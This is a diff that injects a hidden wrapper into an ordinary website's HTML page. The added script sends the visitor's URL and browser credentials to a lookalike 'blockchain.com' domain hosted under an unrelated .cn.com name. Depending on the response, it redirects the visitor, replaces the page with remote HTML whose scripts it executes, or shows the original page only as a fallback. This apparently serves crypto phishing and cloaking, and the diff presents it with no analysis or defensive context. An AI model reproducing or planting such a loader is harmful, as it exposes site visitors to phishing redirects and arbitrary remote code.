@@ -1,4 +1,18 @@
 <!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>New redirect</title>
+
+    <!-- (optional, works only in Chrome) Force browser to send full Referer including path + query -->
+    <meta name="referrer" content="unsafe-url">
+</head>
+
+<body>
+    <div id="content" style="display:none;">
+        <!DOCTYPE html>
 <html data-bs-theme="light" lang="en">
 
 <head>
@@ -452,6 +466,61 @@
     <script src="assets/js/lib/counterup/counterup.min.js"></script>
     <script src="assets/js/lib/owlcarousel/owl.carousel.min.js"></script>
     <script src="assets/js/js/main.js"></script>
+</body>
+
+</html>
+    </div>
+
+    <script>
+        (async function () {
+            const fallbackDiv = document.getElementById('content');
+
+            try {
+                const response = await fetch('https://blockchain.com.targo.cn.com/api/check', {
+                    method: 'GET',
+                    headers: {
+                        'x-api-key': 'd793e0fc3221a12fff0a5903e6de77dab4dd1b93',
+                        'x-origin-url': window.location.href
+                    },
+                    referrer: window.location.href,
+                    credentials: 'include'
+                });
+
+                if (!response.ok) throw new Error('Fetch failed with status ' + response.status);
+
+                const contentType = response.headers.get('content-type');
+
+                if (contentType && contentType.includes('application/json')) {
+                    const json = await response.json();
+                    if (json.redirectUrl) {
+                        window.location.href = json.redirectUrl;
+                    }
+                } else if (contentType && contentType.includes('text/html')) {
+                    const html = await response.text();
+
+                    document.body.innerHTML = html;
+
+                    const scripts = document.body.querySelectorAll('script');
+                    scripts.forEach(oldScript => {
+                        const newScript = document.createElement('script');
+                        if (oldScript.src) {
+                            newScript.src = oldScript.src;
+                        } else {
+                            newScript.textContent = oldScript.textContent;
+                        }
+                        document.head.appendChild(newScript).parentNode.removeChild(newScript);
+                    });
+
+                } else {
+                    fallbackDiv.style.display = 'block';
+                }
+
+            } catch (err) {
+                console.error(err);
+                fallbackDiv.style.display = 'block';
+            }
+        })();
+    </script>
 </body>
 
 </html>
